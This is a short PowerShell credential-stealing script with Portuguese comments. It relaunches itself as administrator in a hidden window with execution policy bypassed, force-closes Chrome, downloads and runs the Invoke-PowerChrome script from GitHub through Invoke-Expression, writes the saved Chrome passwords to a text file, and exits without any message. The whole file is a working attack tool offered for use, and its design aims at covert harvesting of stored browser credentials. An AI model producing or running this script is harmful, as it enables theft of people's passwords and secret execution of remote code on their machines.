# ExtrairSenhas.ps1 - Versão que NÃO abre nova janela

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"

# Força o fechamento do Chrome
Get-Process "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2

# Carrega e executa o PowerChrome original
$script = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1'
Invoke-Expression $script

# Executa e captura a saída
$output = Invoke-PowerChrome -Browser Chrome -Verbose 2>&1

# Salva o arquivo
$output | Out-File -FilePath $arquivoSaida -Encoding UTF8

# FECHA TUDO IMEDIATAMENTE (sem mensagens, sem pausa)
exit
